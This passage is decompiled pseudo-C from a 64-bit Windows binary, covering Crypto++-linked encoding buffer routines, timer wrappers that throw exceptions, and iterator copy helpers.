          *v16 |= v13 >> (v14 - 8);
          *(_BYTE *)(*(_DWORD *)(v6 + 68) + 1 + *(_QWORD *)(v6 + 96)) |= (_BYTE)v13 << (16 - v14);
        }
        else
        {
          v15 = (_BYTE *)(*(signed int *)(v6 + 68) + *(_QWORD *)(v6 + 96));
          *v15 |= (_BYTE)v13 << (8 - v14);
        }
        *(_DWORD *)(v6 + 72) = v14;
        if ( v14 >= 8 )
        {
          v17 = *(_DWORD *)(v6 + 68);
          do
          {
            v14 -= 8;
            ++v17;
          }
          while ( v14 >= 8 );
          *(_DWORD *)(v6 + 68) = v17;
          *(_DWORD *)(v6 + 72) = v14;
        }
        if ( *(_DWORD *)(v6 + 68) == *(_DWORD *)(v6 + 64) )
          goto LABEL_19;
      }
    }
    if ( !v8 )
      return 0i64;
  }
  LODWORD(v23) = v8;
  if ( !sub_14005A600(v6, 2, *(_QWORD *)(v6 + 96), *(signed int *)(v6 + 68), v23, v5, (__int64)&qword_1400D8080) )
  {
    *(_QWORD *)(v6 + 68) = 0i64;
    return 0i64;
  }
  v21 = (__int64 *)&v25;
  v22 = *(signed int *)(v6 + 68) - *(_QWORD *)(v6 + 32);
  v24 = 1i64;
  v25 = v22;
  if ( v22 <= 1 )
    v21 = &v24;
  return *v21;
}

//----- (0000000140067650) ----------------------------------------------------
__int64 __fastcall sub_140067650(__int64 a1, __int64 a2, unsigned __int64 a3, int a4, char a5)
{
  char v5; // si
  __int64 v6; // rbx
  int v7; // ecx
  int v8; // er14
  unsigned __int64 v9; // rdi
  __int64 v10; // rbp
  int v11; // ecx
  __int64 v12; // rax
  unsigned int v13; // er11
  unsigned int v14; // er10
  _BYTE *v15; // r8
  unsigned int v16; // er9
  char v17; // cl
  _BYTE *v18; // r8
  int v19; // eax
  int v20; // er9
  __int64 v21; // r8
  __int64 v22; // rdx
  __int64 v23; // rcx
  __int64 *v24; // rax
  unsigned __int64 v25; // rcx
  int v27; // er8
  __int64 v28; // r9
  __int64 v29; // rdx
  __int64 v30; // rcx
  int v31; // edx
  __int64 v32; // rcx
  __int64 *v33; // rax
  unsigned __int64 v34; // rcx
  __int64 v35; // [rsp+20h] [rbp-58h]
  __int64 v36; // [rsp+40h] [rbp-38h]
  unsigned __int64 v37; // [rsp+80h] [rbp+8h]

  v5 = a5;
  v6 = a1;
  v7 = *(_DWORD *)(a1 + 40);
  v8 = a4;
  v9 = a3;
  v10 = a2;
  if ( !v7 )
  {
    *(_QWORD *)(v6 + 32) = 0i64;
    goto LABEL_6;
  }
  v11 = v7 - 1;
  if ( v11 )
  {
    if ( v11 != 1 )
      return 0i64;
  }
  else
  {
LABEL_17:
    LODWORD(v35) = 0;
    if ( sub_14005A600(v6, 1, *(_QWORD *)(v6 + 96), *(signed int *)(v6 + 64), v35, v5, (__int64)&qword_1400D8080) )
    {
      v24 = (__int64 *)&v37;
      v25 = *(signed int *)(v6 + 64) - *(_QWORD *)(v6 + 32);
      v36 = 1i64;
      v37 = v25;
      if ( v25 <= 1 )
        v24 = &v36;
      return *v24;
    }
    *(_QWORD *)(v6 + 68) = 0i64;
LABEL_6:
    while ( *(_QWORD *)(v6 + 32) < v9 )
    {
      if ( !*(_DWORD *)(v6 + 68) )
        memset(*(void **)(v6 + 96), 0, *(signed int *)(v6 + 64));
      v12 = *(_QWORD *)(v6 + 32);
      v13 = *(unsigned __int8 *)(v12 + v10);
      v14 = *(_DWORD *)(v6 + 60) - *(_DWORD *)(v6 + 72);
      v15 = (_BYTE *)(*(_QWORD *)(v6 + 96) + *(signed int *)(v6 + 68));
      v16 = 8;
      *(_QWORD *)(v6 + 32) = v12 + 1;
      *v15 |= v13 >> (8 - v14);
      if ( v14 > 8 )
      {
LABEL_12:
        *(_DWORD *)(v6 + 72) += v16;
      }
      else
      {
        while ( 1 )
        {
          ++*(_DWORD *)(v6 + 68);
          *(_DWORD *)(v6 + 72) = 0;
          v16 -= v14;
          if ( !v16 )
            break;
          v17 = v14;
          v14 = *(_DWORD *)(v6 + 60);
          v18 = (_BYTE *)(*(_QWORD *)(v6 + 96) + *(signed int *)(v6 + 68));
          LOBYTE(v13) = v13 << v17;
          *v18 |= (unsigned __int8)v13 >> (8 - v14);
          if ( v16 < v14 )
            goto LABEL_12;
        }
      }
      v19 = *(_DWORD *)(v6 + 68);
      if ( v19 == *(_DWORD *)(v6 + 64) )
      {
        v20 = 0;
        if ( v19 > 0 )
        {
          v21 = 0i64;
          do
          {
            v22 = *(_QWORD *)(v6 + 96);
            ++v20;
            v23 = *(unsigned __int8 *)(v22 + v21++);
            *(_BYTE *)(v22 + v21 - 1) = *(_BYTE *)(v23 + *(_QWORD *)(v6 + 48));
          }
          while ( v20 < *(_DWORD *)(v6 + 68) );
        }
        goto LABEL_17;
      }
    }
    if ( !v8 )
      return 0i64;
    if ( *(_DWORD *)(v6 + 72) > 0 )
      ++*(_DWORD *)(v6 + 68);
    v27 = 0;
    if ( *(_DWORD *)(v6 + 68) > 0 )
    {
      v28 = 0i64;
      do
      {
        v29 = *(_QWORD *)(v6 + 96);
        ++v27;
        v30 = *(unsigned __int8 *)(v29 + v28++);
        *(_BYTE *)(v29 + v28 - 1) = *(_BYTE *)(v30 + *(_QWORD *)(v6 + 48));
      }
      while ( v27 < *(_DWORD *)(v6 + 68) );
    }
    v31 = *(_DWORD *)(v6 + 56);
    if ( v31 != -1 )
    {
      v32 = *(signed int *)(v6 + 68);
      if ( (signed int)v32 > 0 )
      {
        memset((void *)(*(_QWORD *)(v6 + 96) + v32), v31, *(_DWORD *)(v6 + 64) - (signed int)v32);
        *(_DWORD *)(v6 + 68) = *(_DWORD *)(v6 + 64);
      }
    }
  }
  LODWORD(v35) = v8;
  if ( !sub_14005A600(v6, 2, *(_QWORD *)(v6 + 96), *(signed int *)(v6 + 68), v35, v5, (__int64)&qword_1400D8080) )
  {
    *(_QWORD *)(v6 + 68) = 0i64;
    return 0i64;
  }
  v33 = (__int64 *)&v37;
  v34 = *(signed int *)(v6 + 68) - *(_QWORD *)(v6 + 32);
  v36 = 1i64;
  v37 = v34;
  if ( v34 <= 1 )
    v33 = &v36;
  return *v33;
}

//----- (00000001400678E0) ----------------------------------------------------
unsigned __int64 __fastcall sub_1400678E0(__int64 a1, __int64 a2, __int64 a3, int a4, char a5)
{
  char v5; // bp
  _QWORD *v6; // rbx
  int v7; // ecx
  int v8; // er15
  unsigned __int64 v9; // rsi
  __int64 v10; // r14
  int v11; // ecx
  int v12; // ecx
  int v13; // ecx
  __int64 v14; // rdx
  __int64 *v15; // rax
  __int64 v16; // rdi
  unsigned __int64 *v17; // rax
  unsigned __int64 v18; // rcx
  unsigned __int64 *v20; // rax
  unsigned __int64 *v21; // rax
  unsigned __int64 *v22; // rax
  unsigned __int64 v23; // rcx
  __int64 v24; // [rsp+20h] [rbp-58h]
  unsigned __int64 v25; // [rsp+40h] [rbp-38h]
  unsigned __int64 v26; // [rsp+80h] [rbp+8h]

  v5 = a5;
  v6 = (_QWORD *)a1;
  v7 = *(_DWORD *)(a1 + 40);
  v8 = a4;
  v9 = a3;
  v10 = a2;
  if ( v7 )
  {
    v11 = v7 - 1;
    if ( !v11 )
      goto LABEL_10;
    v12 = v11 - 1;
    if ( !v12 )
    {
      while ( 1 )
      {
        v14 = v6[4];
        v26 = v6[12] - v6[13];
        v15 = (__int64 *)&v26;
        v25 = v9 - v14;
        if ( v26 >= v9 - v14 )
          v15 = (__int64 *)&v25;
        v16 = *v15;
        LODWORD(v24) = 0;
        if ( sub_14005A600((__int64)v6, 2, v14 + v10, *v15, v24, v5, (__int64)&qword_1400D8080) )
          break;
        v6[4] += v16;
        v6[13] += v16;
LABEL_8:
        if ( v6[4] >= v9 )
          goto LABEL_26;
        if ( v6[13] == v6[12] )
        {
LABEL_10:
          LODWORD(v24) = 0;
          if ( sub_14005A600((__int64)v6, 1, v6[8], v6[7], v24, v5, (__int64)&qword_1400D8080) )
          {
            v17 = &v26;
            v18 = v6[7] - v6[4];
            v25 = 1i64;
            v26 = v18;
            if ( v18 <= 1 )
              v17 = &v25;
            return *v17;
          }
          v6[13] = 0i64;
        }
      }
      v20 = &v26;
      v26 = v16 - v6[4];
      v25 = 1i64;
      if ( v26 <= 1 )
        v20 = &v25;
      return *v20;
    }
    v13 = v12 - 1;
    if ( v13 )
    {
      if ( v13 != 1 )
        return 0i64;
LABEL_27:
      LODWORD(v24) = v8;
      if ( sub_14005A600((__int64)v6, 4, v6[11], v6[10], v24, v5, (__int64)&qword_1400D8080) )
      {
        v22 = &v26;
        v23 = v6[10] - v6[4];
        v25 = 1i64;
        v26 = v23;
        if ( v23 <= 1 )
          v22 = &v25;
        return *v22;
      }
      v6[13] = 0i64;
      return 0i64;
    }
  }
  else
  {
    v6[4] = 0i64;
    if ( v6[12] )
      goto LABEL_8;
  }
  LODWORD(v24) = 0;
  if ( !sub_14005A600((__int64)v6, 3, a2, a3, v24, v5, (__int64)&qword_1400D8080) )
  {
LABEL_26:
    if ( !v8 )
      return 0i64;
    goto LABEL_27;
  }
  v21 = &v26;
  v26 = v9 - v6[4];
  v25 = 1i64;
  if ( v26 <= 1 )
    v21 = &v25;
  return *v21;
}

//----- (0000000140067B40) ----------------------------------------------------
__int64 __fastcall sub_140067B40(__int64 a1, __int64 a2, _QWORD *a3, char a4)
{
  char v4; // bp
  _QWORD *v5; // r14
  __int64 v6; // rsi
  __int64 v7; // rdi
  _QWORD *v8; // rax
  _QWORD *v9; // rbx
  __int64 v10; // r14
  void (__fastcall ***v11)(_QWORD, signed __int64); // rcx
  void (__fastcall ***v12)(_QWORD, signed __int64); // rcx

  v4 = a4;
  v5 = a3;
  v6 = a2;
  v7 = a1;
  v8 = operator new(0x28ui64);
  v9 = v8;
  if ( v8 )
  {
    v8[1] = v6;
    *((_BYTE *)v8 + 16) = v4;
    *((_BYTE *)v8 + 17) = 0;
    v8[3] = 0i64;
    *v8 = &off_1400AD900;
    v8[4] = *v5;
  }
  else
  {
    v9 = 0i64;
  }
  v10 = *(_QWORD *)(v7 + 8);
  *(_QWORD *)(v7 + 8) = 0i64;
  v11 = (void (__fastcall ***)(_QWORD, signed __int64))v9[3];
  if ( v11 )
    (**v11)(v11, 1i64);
  v9[3] = v10;
  v12 = *(void (__fastcall ****)(_QWORD, signed __int64))(v7 + 8);
  if ( v12 )
    (**v12)(v12, 1i64);
  *(_QWORD *)(v7 + 8) = v9;
  *(_BYTE *)(v7 + 16) = v4;
  return v7;
}
// 1400AD900: using guessed type __int64 (__fastcall *off_1400AD900)(void *);

//----- (0000000140067C00) ----------------------------------------------------
__int64 __fastcall sub_140067C00(__int64 a1, __int64 a2, _QWORD *a3, char a4)
{
  char v4; // bl
  _QWORD *v5; // rdi
  __int64 v6; // rsi
  __int64 v7; // rbp
  __int64 v8; // rax
  __int64 v9; // rax
  __int64 v11; // [rsp+30h] [rbp-28h]
  void (__fastcall ***v12)(_QWORD, signed __int64); // [rsp+38h] [rbp-20h]

  v4 = a4;
  v5 = a3;
  v6 = a2;
  v7 = a1;
  v8 = sub_140053D40((__int64)&v11);
  v9 = sub_140067B40(v8, v6, v5, v4);
  sub_140053CE0(v7, v9);
  if ( v12 )
    (**v12)(v12, 1i64);
  return v7;
}

//----- (0000000140067C90) ----------------------------------------------------
__int64 __fastcall sub_140067C90(__int64 a1, void *a2, __int64 a3, __int64 *a4)
{
  __int64 *v4; // rbx
  __int64 v5; // rdi
  void *v6; // rbp
  __int64 v7; // rsi
  __int64 result; // rax

  v4 = a4;
  v5 = a3;
  v6 = a2;
  v7 = a1;
  if ( !qword_1400DAB40
    || !(unsigned __int8)type_info::operator==(
                           &unsigned char const * `RTTI Type Descriptor',
                           &int `RTTI Type Descriptor')
    || (result = qword_1400DAB40(v5, v4, v7 + 32), !(_BYTE)result) )
  {
    sub_1400293A0(v6, (__int64)&unsigned char const * `RTTI Type Descriptor', v5);
    result = *(_QWORD *)(v7 + 32);
    *v4 = result;
  }
  return result;
}
// 1400A1928: using guessed type __int64 __fastcall type_info::operator==(_QWORD, _QWORD);
// 1400D8D00: using guessed type int int `RTTI Type Descriptor';
// 1400D90C0: using guessed type const unsigned __int8 *unsigned char const * `RTTI Type Descriptor';
// 1400DAB40: using guessed type __int64 (__fastcall *qword_1400DAB40)(_QWORD, _QWORD, _QWORD);

//----- (0000000140067D20) ----------------------------------------------------
__int64 __fastcall sub_140067D20(__int64 a1, __int64 a2)
{
  _QWORD *v2; // rbx
  __int64 v3; // rdi
  __int64 result; // rax

  v2 = (_QWORD *)a2;
  v3 = a1;
  if ( a2 )
  {
    sub_140023920(a2, a1);
    *v2 = &off_1400AD900;
    result = *(_QWORD *)(v3 + 32);
    v2[4] = result;
  }
  return result;
}
// 1400AD900: using guessed type __int64 (__fastcall *off_1400AD900)(void *);

//----- (0000000140067D70) ----------------------------------------------------
LARGE_INTEGER sub_140067D70()
{
  LARGE_INTEGER PerformanceCount; // [rsp+20h] [rbp-88h]
  __int64 v2; // [rsp+28h] [rbp-80h]
  char v3; // [rsp+30h] [rbp-78h]
  __int64 v4; // [rsp+40h] [rbp-68h]
  __int64 v5; // [rsp+48h] [rbp-60h]
  __int64 (__fastcall **v6)(void *); // [rsp+50h] [rbp-58h]
  int v7; // [rsp+68h] [rbp-40h]
  char Dst; // [rsp+70h] [rbp-38h]
  __int64 v9; // [rsp+80h] [rbp-28h]
  __int64 v10; // [rsp+88h] [rbp-20h]

  v2 = -2i64;
  PerformanceCount.QuadPart = 0i64;
  if ( !QueryPerformanceCounter(&PerformanceCount) )
  {
    v5 = 15i64;
    v4 = 0i64;
    v3 = 0;
    sub_140004F20(&v3, byte_1400A3400, 0i64);
    std::exception::exception((std::exception *)&v6);
    v6 = &off_1400A8798;
    v7 = 6;
    v10 = 15i64;
    v9 = 0i64;
    Dst = 0;
    sub_140004DF0(&Dst, &v3, 0i64, 0xFFFFFFFFFFFFFFFFui64);
    CxxThrowException(&v6, &_TI2_AVcls_000_CryptoPP__);
  }
  return PerformanceCount;
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400A1930: using guessed type _QWORD std::exception::exception(std::exception *__hidden this);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);
// 1400D45F8: using guessed type int _TI2_AVcls_000_CryptoPP__;

//----- (0000000140067E60) ----------------------------------------------------
LARGE_INTEGER sub_140067E60()
{
  LARGE_INTEGER result; // rax
  char v1; // [rsp+28h] [rbp-80h]
  __int64 v2; // [rsp+38h] [rbp-70h]
  __int64 v3; // [rsp+40h] [rbp-68h]
  __int64 (__fastcall **v4)(void *); // [rsp+50h] [rbp-58h]
  int v5; // [rsp+68h] [rbp-40h]
  char Dst; // [rsp+70h] [rbp-38h]
  __int64 v7; // [rsp+80h] [rbp-28h]
  __int64 v8; // [rsp+88h] [rbp-20h]

  result = Frequency;
  if ( !Frequency.QuadPart )
  {
    if ( !QueryPerformanceFrequency(&Frequency) )
    {
      v3 = 15i64;
      v2 = 0i64;
      v1 = 0;
      sub_140004F20(&v1, byte_1400A3400, 0i64);
      std::exception::exception((std::exception *)&v4);
      v4 = &off_1400A8798;
      v5 = 6;
      v8 = 15i64;
      v7 = 0i64;
      Dst = 0;
      sub_140004DF0(&Dst, &v1, 0i64, 0xFFFFFFFFFFFFFFFFui64);
      CxxThrowException(&v4, &_TI2_AVcls_000_CryptoPP__);
    }
    result = Frequency;
  }
  return result;
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400A1930: using guessed type _QWORD std::exception::exception(std::exception *__hidden this);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);
// 1400D45F8: using guessed type int _TI2_AVcls_000_CryptoPP__;

//----- (0000000140067F60) ----------------------------------------------------
_QWORD *__fastcall sub_140067F60(_QWORD *a1, __int64 a2, __int64 a3, __int64 a4)
{
  _QWORD **v4; // rax
  _QWORD *v5; // rbx
  _QWORD *v6; // rax
  __int64 v7; // rax
  _QWORD *v8; // rax
  __int64 v9; // rax
  _QWORD *v10; // rax
  __int128 v12; // [rsp+30h] [rbp-58h]
  __int64 v13; // [rsp+40h] [rbp-48h]
  __int128 v14; // [rsp+48h] [rbp-40h]
  __int64 v15; // [rsp+58h] [rbp-30h]
  __int128 v16; // [rsp+60h] [rbp-28h]
  __int64 v17; // [rsp+70h] [rbp-18h]

  v4 = *(_QWORD ***)a4;
  v5 = a1;
  _mm_storeu_si128((__m128i *)&v12, (__m128i)0i64);
  if ( v4 )
  {
    v6 = *v4;
    if ( v6 )
      *(_QWORD *)&v12 = *v6;
  }
  v7 = *(_QWORD *)(a4 + 16);
  _mm_storeu_si128((__m128i *)&v14, (__m128i)0i64);
  v13 = v7;
  if ( *(_QWORD *)a3 )
  {
    v8 = **(_QWORD ***)a3;
    if ( v8 )
      *(_QWORD *)&v14 = *v8;
  }
  v9 = *(_QWORD *)(a3 + 16);
  _mm_storeu_si128((__m128i *)&v16, (__m128i)0i64);
  v15 = v9;
  if ( *(_QWORD *)a2 )
  {
    v10 = **(_QWORD ***)a2;
    if ( v10 )
      *(_QWORD *)&v16 = *v10;
  }
  v17 = *(_QWORD *)(a2 + 16);
  sub_140068010(a1, (__int64)&v16, (__int64)&v14, (__int64 **)&v12);
  return v5;
}

//----- (0000000140068010) ----------------------------------------------------
_QWORD *__fastcall sub_140068010(_QWORD *a1, __int64 a2, __int64 a3, __int64 **a4)
{
  __int64 **v4; // rdi
  __int64 v5; // rbp
  __int64 v6; // rsi
  _QWORD *i; // r14
  _DWORD *v8; // rbx
  _QWORD *v9; // rax

  v4 = a4;
  v5 = a3;
  v6 = a2;
  for ( i = a1; *(_QWORD *)(v6 + 16) != *(_QWORD *)(v5 + 16); ++*(_QWORD *)(v6 + 16) )
  {
    v8 = (_DWORD *)sub_140068730((__int64 **)v6);
    *(_DWORD *)sub_140068730(v4) = *v8;
    v4[2] = (__int64 *)((char *)v4[2] + 1);
  }
  *i = 0i64;
  i[1] = 0i64;
  if ( *v4 )
  {
    v9 = (_QWORD *)**v4;
    if ( v9 )
      *i = *v9;
  }
  i[2] = v4[2];
  return i;
}

//----- (00000001400680B0) ----------------------------------------------------
_QWORD *__fastcall sub_1400680B0(_QWORD *a1, __int64 a2, __int64 a3, __int64 a4)
{
  _QWORD **v4; // rax
  _QWORD *v5; // rbx
  _QWORD *v6; // rax
  __int64 v7; // rax
  _QWORD *v8; // rax
  __int64 v9; // rax
  _QWORD *v10; // rax
  __int128 v12; // [rsp+30h] [rbp-58h]
  __int64 v13; // [rsp+40h] [rbp-48h]
  __int128 v14; // [rsp+48h] [rbp-40h]
  __int64 v15; // [rsp+58h] [rbp-30h]
  __int128 v16; // [rsp+60h] [rbp-28h]
  __int64 v17; // [rsp+70h] [rbp-18h]

  v4 = *(_QWORD ***)a4;
  v5 = a1;
  _mm_storeu_si128((__m128i *)&v12, (__m128i)0i64);
  if ( v4 )
  {
    v6 = *v4;
    if ( v6 )
      *(_QWORD *)&v12 = *v6;
  }
  v7 = *(_QWORD *)(a4 + 16);
  _mm_storeu_si128((__m128i *)&v14, (__m128i)0i64);
  v13 = v7;
  if ( *(_QWORD *)a3 )
  {
    v8 = **(_QWORD ***)a3;
    if ( v8 )
      *(_QWORD *)&v14 = *v8;
  }
  v9 = *(_QWORD *)(a3 + 16);
  _mm_storeu_si128((__m128i *)&v16, (__m128i)0i64);
  v15 = v9;
  if ( *(_QWORD *)a2 )
  {
    v10 = **(_QWORD ***)a2;
    if ( v10 )
      *(_QWORD *)&v16 = *v10;
  }
  v17 = *(_QWORD *)(a2 + 16);
  sub_140068160(a1, (__int64)&v16, (__int64)&v14, (__int64 **)&v12);
  return v5;
}

//----- (0000000140068160) ----------------------------------------------------
_QWORD *__fastcall sub_140068160(_QWORD *a1, __int64 a2, __int64 a3, __int64 **a4)
{
  __int64 **v4; // rdi
  __int64 v5; // rbp
  __int64 v6; // rsi
  _QWORD *i; // r14
  _QWORD *v8; // rbx
  _QWORD *v9; // rax

  v4 = a4;
  v5 = a3;
  v6 = a2;
  for ( i = a1; *(_QWORD *)(v6 + 16) != *(_QWORD *)(v5 + 16); ++*(_QWORD *)(v6 + 16) )
  {
    v8 = (_QWORD *)sub_140068770((__int64 **)v6);
    *(_QWORD *)sub_140068770(v4) = *v8;
    v4[2] = (__int64 *)((char *)v4[2] + 1);
  }
  *i = 0i64;
  i[1] = 0i64;
  if ( *v4 )
  {
    v9 = (_QWORD *)**v4;
    if ( v9 )
      *i = *v9;
  }
  i[2] = v4[2];
  return i;
}

//----- (0000000140068200) ----------------------------------------------------
_QWORD *__fastcall sub_140068200(_QWORD *a1, __int64 a2, __int64 a3, __int64 a4)
{
  _QWORD **v4; // rax
  _QWORD *v5; // rbx
  _QWORD *v6; // rax
  __int64 v7; // rax
  _QWORD *v8; // rax
  __int64 v9; // rax
  _QWORD *v10; // rax
  __int128 v12; // [rsp+30h] [rbp-58h]
  __int64 v13; // [rsp+40h] [rbp-48h]
  __int128 v14; // [rsp+48h] [rbp-40h]
  __int64 v15; // [rsp+58h] [rbp-30h]
  __int128 v16; // [rsp+60h] [rbp-28h]
  __int64 v17; // [rsp+70h] [rbp-18h]

  v4 = *(_QWORD ***)a4;
  v5 = a1;
  _mm_storeu_si128((__m128i *)&v12, (__m128i)0i64);
  if ( v4 )
  {
    v6 = *v4;
    if ( v6 )
      *(_QWORD *)&v12 = *v6;
  }
  v7 = *(_QWORD *)(a4 + 16);
  _mm_storeu_si128((__m128i *)&v14, (__m128i)0i64);
  v13 = v7;
  if ( *(_QWORD *)a3 )
  {
    v8 = **(_QWORD ***)a3;
    if ( v8 )
      *(_QWORD *)&v14 = *v8;
  }
  v9 = *(_QWORD *)(a3 + 16);
  _mm_storeu_si128((__m128i *)&v16, (__m128i)0i64);
  v15 = v9;
  if ( *(_QWORD *)a2 )
  {
    v10 = **(_QWORD ***)a2;
    if ( v10 )
      *(_QWORD *)&v16 = *v10;
  }
  v17 = *(_QWORD *)(a2 + 16);
  sub_1400682B0(a1, (__int64)&v16, (__int64)&v14, (__int64 **)&v12);
  return v5;
}

//----- (00000001400682B0) ----------------------------------------------------
_QWORD *__fastcall sub_1400682B0(_QWORD *a1, __int64 a2, __int64 a3, __int64 **a4)
{
  __int64 **v4; // rdi
  __int64 v5; // rsi
  __int64 v6; // rbp
  _QWORD *i; // r14
  _DWORD *v8; // rax
  _QWORD *v9; // rax

  v4 = a4;
  v5 = a3;
  v6 = a2;
  for ( i = a1; *(_QWORD *)(v6 + 16) != *(_QWORD *)(v5 + 16); *(_DWORD *)sub_140068730(v4) = *v8 )
  {
    --*(_QWORD *)(v5 + 16);
    v8 = (_DWORD *)sub_140068730((__int64 **)v5);
    v4[2] = (__int64 *)((char *)v4[2] - 1);
  }
  *i = 0i64;
  i[1] = 0i64;
  if ( *v4 )
  {
    v9 = (_QWORD *)**v4;
    if ( v9 )
      *i = *v9;
  }
  i[2] = v4[2];
  return i;
}

//----- (0000000140068350) ----------------------------------------------------
_QWORD *__fastcall sub_140068350(_QWORD *a1, __int64 a2, __int64 a3, __int64 a4)
{
  _QWORD **v4; // rax
  _QWORD *v5; // rbx
  _QWORD *v6; // rax
  __int64 v7; // rax
  _QWORD *v8; // rax
  __int64 v9; // rax
  _QWORD *v10; // rax
  __int128 v12; // [rsp+30h] [rbp-58h]
  __int64 v13; // [rsp+40h] [rbp-48h]
  __int128 v14; // [rsp+48h] [rbp-40h]
  __int64 v15; // [rsp+58h] [rbp-30h]
  __int128 v16; // [rsp+60h] [rbp-28h]
  __int64 v17; // [rsp+70h] [rbp-18h]

  v4 = *(_QWORD ***)a4;
  v5 = a1;
  _mm_storeu_si128((__m128i *)&v12, (__m128i)0i64);
  if ( v4 )
  {
    v6 = *v4;
    if ( v6 )
      *(_QWORD *)&v12 = *v6;
  }
  v7 = *(_QWORD *)(a4 + 16);
  _mm_storeu_si128((__m128i *)&v14, (__m128i)0i64);
  v13 = v7;
  if ( *(_QWORD *)a3 )
  {
    v8 = **(_QWORD ***)a3;
    if ( v8 )
      *(_QWORD *)&v14 = *v8;
  }
  v9 = *(_QWORD *)(a3 + 16);
  _mm_storeu_si128((__m128i *)&v16, (__m128i)0i64);
  v15 = v9;
  if ( *(_QWORD *)a2 )
  {
    v10 = **(_QWORD ***)a2;
    if ( v10 )
      *(_QWORD *)&v16 = *v10;
  }
  v17 = *(_QWORD *)(a2 + 16);
  sub_140068400(a1, (__int64)&v16, (__int64)&v14, (__int64 **)&v12);
  return v5;
}

//----- (0000000140068400) ----------------------------------------------------
_QWORD *__fastcall sub_140068400(_QWORD *a1, __int64 a2, __int64 a3, __int64 **a4)
{
  __int64 **v4; // rdi
  __int64 v5; // rsi
  __int64 v6; // rbp
  _QWORD *i; // r14
  _QWORD *v8; // rax
  _QWORD *v9; // rax

  v4 = a4;
  v5 = a3;
  v6 = a2;
  for ( i = a1; *(_QWORD *)(v6 + 16) != *(_QWORD *)(v5 + 16); *(_QWORD *)sub_140068770(v4) = *v8 )
  {
    --*(_QWORD *)(v5 + 16);
    v8 = (_QWORD *)sub_140068770((__int64 **)v5);
    v4[2] = (__int64 *)((char *)v4[2] - 1);
  }
  *i = 0i64;
  i[1] = 0i64;
  if ( *v4 )
  {
    v9 = (_QWORD *)**v4;
    if ( v9 )
      *i = *v9;
  }
  i[2] = v4[2];
  return i;
}

//----- (00000001400684A0) ----------------------------------------------------
__int64 *__fastcall sub_1400684A0(_QWORD **a1, __int64 a2, unsigned int *a3)
{
  __int64 **v3; // rax
  __int64 v4; // r10
  unsigned int *v5; // rbx
  _QWORD **v6; // r9
  __int64 *v7; // rax
  __int64 ***v8; // rcx
  __int64 v9; // r11
  __int64 *result; // rax
  __int64 **v11; // rcx
  __int64 v12; // rcx
  unsigned __int64 v13; // r9
  unsigned __int64 v14; // rdx
  unsigned __int64 v15; // r8
  __m128i v16; // [rsp+0h] [rbp-28h]

  v3 = *(__int64 ***)a2;
  v4 = 0i64;
  v5 = a3;
  v6 = a1;
  v16.m128i_i64[0] = 0i64;
  if ( v3 )
  {
    v7 = *v3;
    if ( v7 )
      v16.m128i_i64[0] = *v7;
  }
  v8 = (__int64 ***)*a1;
  v9 = *(_QWORD *)(a2 + 16);
  result = 0i64;
  if ( v8 )
  {
    v11 = *v8;
    if ( v11 )
      result = *v11;
  }
  v12 = (__int64)v6[2];
  if ( result )
    v4 = *result;
  v16.m128i_i64[0] = v4;
  v16.m128i_i64[1] = v12;
  _mm_store_si128(&v16, v16);
  if ( v12 != v9 )
  {
    v13 = v16.m128i_u64[1];
    do
    {
      v14 = v13 & 3;
      v15 = v13++ >> 2;
      result = (__int64 *)*v5;
      *(_DWORD *)(*(_QWORD *)(*(_QWORD *)(v4 + 8) + 8 * ((*(_QWORD *)(v4 + 16) - 1i64) & v15)) + 4 * v14) = (_DWORD)result;
    }
    while ( v13 != v9 );
  }
  return result;
}

//----- (0000000140068550) ----------------------------------------------------
__int64 *__fastcall sub_140068550(_QWORD **a1, __int64 a2, __int64 **a3)
{
  __int64 **v3; // rax
  __int64 v4; // r10
  __int64 **v5; // rbx
  _QWORD **v6; // r9
  __int64 *v7; // rax
  __int64 ***v8; // rcx
  __int64 v9; // r11
  __int64 *result; // rax
  __int64 **v11; // rcx
  __int64 v12; // rcx
  unsigned __int64 v13; // r9
  unsigned __int64 v14; // rdx
  unsigned __int64 v15; // r8
  __m128i v16; // [rsp+0h] [rbp-28h]

  v3 = *(__int64 ***)a2;
  v4 = 0i64;
  v5 = a3;
  v6 = a1;
  v16.m128i_i64[0] = 0i64;
  if ( v3 )
  {
    v7 = *v3;
    if ( v7 )
      v16.m128i_i64[0] = *v7;
  }
  v8 = (__int64 ***)*a1;
  v9 = *(_QWORD *)(a2 + 16);
  result = 0i64;
  if ( v8 )
  {
    v11 = *v8;
    if ( v11 )
      result = *v11;
  }
  v12 = (__int64)v6[2];
  if ( result )
    v4 = *result;
  v16.m128i_i64[0] = v4;
  v16.m128i_i64[1] = v12;
  _mm_store_si128(&v16, v16);
  if ( v12 != v9 )
  {
    v13 = v16.m128i_u64[1];
    do
    {
      v14 = v13 & 1;
      v15 = v13++ >> 1;
      result = *v5;
      *(_QWORD *)(*(_QWORD *)(*(_QWORD *)(v4 + 8) + 8 * ((*(_QWORD *)(v4 + 16) - 1i64) & v15)) + 8 * v14) = *v5;
    }
    while ( v13 != v9 );
  }
  return result;
}

//----- (0000000140068600) ----------------------------------------------------
__int64 __fastcall sub_140068600(__int64 a1, unsigned int a2)
{
  unsigned int v2; // ebx
  __int64 v3; // rdi
  _QWORD *v4; // rbx
  _OWORD *v5; // rax
  _QWORD *v6; // rbx
  _OWORD *v7; // rax
  int v9; // [rsp+58h] [rbp+10h]
  _QWORD *v10; // [rsp+60h] [rbp+18h]
  _QWORD *v11; // [rsp+68h] [rbp+20h]

  v2 = a2;
  v3 = a1;
  sub_140036DA0(a1, 0);
  *(_DWORD *)(v3 + 24) = -1;
  *(_QWORD *)v3 = &off_1400ADA48;
  *(_QWORD *)(v3 + 8) = off_1400ADBA8;
  sub_1400565B0(v3 + 32, v2);
  v10 = 0i64;
  v4 = (_QWORD *)(v3 + 112);
  v11 = v4;
  *v4 = 0i64;
  v4[1] = 0i64;
  v4[2] = 0i64;
  v4[3] = 0i64;
  v4[4] = 0i64;
  v5 = operator new(0x10ui64);
  if ( !v5 )
  {
    std::_Xbad_alloc();
    __debugbreak();
  }
  *v4 = v5;
  *v5 = 0i64;
  *(_QWORD *)*v4 = v4;
  sub_140068F10(v3 + 112, 1i64, (__int64 *)&v10);
  v9 = 0;
  v6 = (_QWORD *)(v3 + 152);
  v10 = v6;
  *v6 = 0i64;
